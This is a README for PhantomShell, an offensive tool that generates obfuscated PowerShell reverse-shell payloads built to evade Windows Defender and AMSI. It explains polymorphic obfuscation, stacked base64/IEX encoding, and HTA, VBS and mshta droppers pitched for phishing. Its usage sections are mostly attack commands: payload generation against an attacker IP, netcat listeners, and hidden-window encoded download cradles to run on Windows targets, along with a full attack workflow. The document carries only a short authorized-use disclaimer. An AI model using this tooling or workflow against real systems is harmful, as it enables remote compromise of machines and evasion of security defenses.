<div align="center">

```
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
       ███████╗██╗  ██╗███████╗██╗     ██╗
       ██╔════╝██║  ██║██╔════╝██║     ██║
       ███████╗███████║█████╗  ██║     ██║
       ╚════██║██╔══██║██╔══╝  ██║     ██║
       ███████║██║  ██║███████╗███████╗███████╗
       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

### Advanced PowerShell AV/AMSI Evasion Framework

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-black?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/adrilaw/PhantomShell)
[![Target](https://img.shields.io/badge/Target-Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/adrilaw/PhantomShell)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Offensive Security](https://img.shields.io/badge/Category-Offensive%20Security-red?style=for-the-badge)](https://github.com/adrilaw/PhantomShell)

> **For authorized penetration testing and red team operations only.**

</div>

---

## 👻 What is PhantomShell?

**PhantomShell** is a next-generation PowerShell reverse-shell payload generator engineered to bypass Windows Defender and AMSI. It goes far beyond simple variable renaming — it combines **polymorphic obfuscation**, **multi-layer encoding**, **junk comment injection**, **keyword case randomization**, and **multiple delivery formats** to produce payloads that look different on every single run.

Built for red teamers, CTF players, and penetration testers who need results, not excuses.

---

## ✨ Features

| Feature | Description |
|---|---|
| 🎭 **3 Obfuscation Profiles** | `minimal`, `aggressive`, `random` — choose your noise level |
| 🔁 **Polymorphic Engine** | Generate N unique variants in one command, each with a different fingerprint |
| 🧅 **Multi-Layer Encoding** | Stack 1–3 nested `utf-16le → base64 → IEX` wrappers |
| 💬 **Junk Comment Injection** | Sprinkles random `<#noise#>` inline comments to break static signatures |
| 🔡 **Keyword Case Mutation** | Randomizes casing on `iex`, `Write`, `Flush`, `Out-String`, and more |
| 📦 **5 Output Formats** | `powershell`, `cmd`, `hta`, `vbs`, `mshta` |
| 🌐 **Built-in HTTP Server** | Hosts your payload and auto-generates the download cradle |
| 🔒 **IP/Port B64 Encoding** | Hides connection details inside the payload itself |
| 🔍 **Payload Fingerprinting** | Every payload gets a unique MD5 fingerprint for tracking |

---

## ⚙️ Installation

**Requirements:** Python 3.8+ · No external dependencies (pure stdlib)

```bash
# Clone the repository
git clone https://github.com/adrilaw/PhantomShell.git
cd PhantomShell

# Make it executable
chmod +x phantomshell.py

# Verify it works
python3 phantomshell.py --help
```

> No pip install needed. PhantomShell uses Python's standard library only.

---

## 🚀 Quick Start

### 1. Basic reverse shell payload

```bash
python3 phantomshell.py revshell -i 10.10.16.98 -p 4444
```

Copy the output, paste it into your target Windows machine. Start your listener:

```bash
nc -lvnp 4444
```

---

## 📖 Usage

### Commands Overview

```
python3 phantomshell.py <command> [options]

Commands:
  revshell     Generate a standalone obfuscated payload
  server       Host payload over HTTP + print the download cradle
  polymorph    Generate N unique polymorphic variants at once
```

---

### `revshell` — Standalone Payload

Generate a self-contained encoded PowerShell command, ready to execute on the target.

```bash
python3 phantomshell.py revshell -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Description | Default |
|---|---|---|
| `-i, --attacker-ip` | Your IP address | *(required)* |
| `-p, --port` | Listening port | *(required)* |
| `-o, --obf-profile` | Obfuscation profile: `minimal` `aggressive` `random` | `aggressive` |
| `--layers` | Encoding layers: `1` `2` `3` | `1` |
| `--format` | Output format: `powershell` `cmd` `hta` `vbs` `mshta` | `powershell` |
| `--enc-b64` | Base64-encode IP and port inside the payload | `false` |
| `--keep-pwd` | Include CWD in shell prompt (may trigger AMSI) | `false` |
| `--do-not-hide` | Omit `-NoP -sta -NonI -W Hidden` flags | `false` |
| `-v, --verbose` | Show intermediate payloads and obfuscation details | `false` |
| `--no-banner` | Suppress the ASCII banner | `false` |

**Examples:**

```bash
# Aggressive obfuscation + 2 encoding layers
python3 phantomshell.py revshell -i 10.10.16.98 -p 4444 -o aggressive --layers 2

# Random variable names + base64-encoded connection details
python3 phantomshell.py revshell -i 10.10.16.98 -p 4444 -o random --enc-b64

# Output as HTA dropper with 3 layers
python3 phantomshell.py revshell -i 10.10.16.98 -p 4444 --format hta --layers 3

# Verbose: see every transformation step
python3 phantomshell.py revshell -i 10.10.16.98 -p 4444 -v
```

---

### `server` — HTTP Payload Hosting

Writes the obfuscated payload to disk, starts a Python HTTP server, and prints a one-liner download cradle for the target to execute.

```bash
python3 phantomshell.py server -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Description | Default |
|---|---|---|
| `-i, --attacker-ip` | Your IP address | *(required)* |
| `-p, --port` | Listening port for reverse shell | *(required)* |
| `--server-port` | HTTP server port | `8000` |
| `-o, --outfile` | Payload filename (random name if omitted) | *(random)* |
| `-O, --obf-profile` | Obfuscation profile | `aggressive` |
| `--layers` | Encoding layers | `1` |
| `--format` | Output format | `powershell` |
| `--enc-b64` | Base64-encode IP/port | `false` |
| `--keep-file` | Do not delete the payload file after serving | `false` |
| `--keep-pwd` | Include CWD in shell prompt | `false` |
| `--do-not-hide` | Omit hidden-window flags | `false` |
| `-v, --verbose` | Verbose output | `false` |

**Examples:**

```bash
# Start HTTP server on default port 8000
python3 phantomshell.py server -i 10.10.16.98 -p 4444

# Custom HTTP port + keep the payload file after use
python3 phantomshell.py server -i 10.10.16.98 -p 4444 --server-port 9090 --keep-file

# Named payload file
python3 phantomshell.py server -i 10.10.16.98 -p 4444 -o update.ps1
```

On the **target machine**, execute the cradle printed by PhantomShell:

```powershell
powershell -NoP -sta -NonI -W Hidden -enc <CRADLE>
```

---

### `polymorph` — Polymorphic Variant Generator

Generate multiple unique payloads in a single command. Each variant uses a different obfuscation profile and randomized variable names — no two share the same signature.

```bash
python3 phantomshell.py polymorph -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Description | Default |
|---|---|---|
| `-i, --attacker-ip` | Your IP address | *(required)* |
| `-p, --port` | Listening port | *(required)* |
| `-n, --count` | Number of unique variants to generate | `3` |
| `--layers` | Encoding layers per variant | `1` |
| `--enc-b64` | Base64-encode IP/port inside each payload | `false` |
| `--keep-pwd` | Include CWD in shell prompt | `false` |
| `-v, --verbose` | Verbose output | `false` |

**Examples:**

```bash
# Generate 5 unique variants
python3 phantomshell.py polymorph -i 10.10.16.98 -p 4444 -n 5

# 10 variants with 2 encoding layers each
python3 phantomshell.py polymorph -i 10.10.16.98 -p 4444 -n 10 --layers 2
```

Each variant is printed with its obfuscation profile and a unique fingerprint:

```
── Variant 1 [aggressive] FP:CFCC983F ────────────────────
── Variant 2 [random]     FP:B2D3A0B7 ────────────────────
── Variant 3 [minimal]    FP:4A7F21E0 ────────────────────
```

---

## 🎯 Obfuscation Profiles Explained

### `minimal`
Basic variable renaming. Fast and clean. Good starting point.
```
$client → $c    $stream → $s    $bytes → $b
$data   → $d    $sendback → $sb  $sendbyte → $sy
```

### `aggressive` *(default)*
Everything in `minimal` plus:
- Backtick-breaks on PS keywords: `New-Object` → `` New-`Ob`ject ``
- Random case mutation on `iex`, `Write`, `Flush`, `Out-String`, `Read`, etc.
- Junk inline comments: `<#xKw7aM#>` injected between statements

### `random`
Fully randomized variable names on every execution. Combined with junk comments. No two runs produce the same payload. Best for evading hash-based detection.

---

## 🧅 Encoding Layers

| Layer | What happens |
|---|---|
| `1` | `utf-16le` → `base64` → PowerShell `-enc` *(standard)* |
| `2` | Layer 1 wrapped in a second `IEX([Convert]::FromBase64String(...))` |
| `3` | Layer 2 wrapped in a third `$d=...; $s=...; IEX($s)` stage |

More layers = more work for AV engines to statically unpack before analysis.

---

## 📦 Output Formats

| Format | Use case |
|---|---|
| `powershell` | Direct PS execution — default, universal |
| `cmd` | Wrap in `cmd /c` for batch scripts or RCE via cmd.exe |
| `hta` | HTML Application dropper — opens with mshta.exe |
| `vbs` | VBScript dropper — `WScript.Shell.Run` |
| `mshta` | `mshta vbscript:` one-liner — useful in phishing / macro delivery |

---

## 📋 Full Attack Workflow Example

```bash
# Terminal 1 — start listener
nc -lvnp 4444

# Terminal 2 — generate + host payload
python3 phantomshell.py server -i 10.10.16.98 -p 4444 --server-port 8080 -O random --layers 2
```

PhantomShell prints a cradle. On the **target** (Windows):

```powershell
powershell -NoP -sta -NonI -W Hidden -enc <PRINTED_CRADLE>
```

Shell lands in Terminal 1. 🎯

---

## ⚠️ Legal Disclaimer

> **PhantomShell is intended exclusively for:**
> - Authorized penetration testing engagements
> - CTF (Capture The Flag) competitions  
> - Red team operations with explicit written permission
> - Security research in controlled lab environments
>
> **Using this tool against systems you do not own or have explicit written authorization to test is illegal and unethical.** The author assumes no liability for misuse. You are solely responsible for your actions.
>
> **Always get written authorization before testing.**

---

## 📜 License

```
MIT License

Copyright (c) 2025 adrilaw

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
```

---

## 🙏 Credits

- Original Nishang one-liner by [samratashok](https://github.com/samratashok/nishang)
- PhantomShell enhancements and framework by [adrilaw](https://github.com/Adrilaw)
- Inspired by the original [BypassAMSI_PSRevshell](https://github.com/gunzf0x/BypassAMSI_PSRevshell) by gunzf0x

---

<div align="center">

**Made with 🖤 by [Adrilaw/Kidpentester](https://github.com/adrilaw)**

*If this helped you pop a shell, drop a ⭐*

</div>
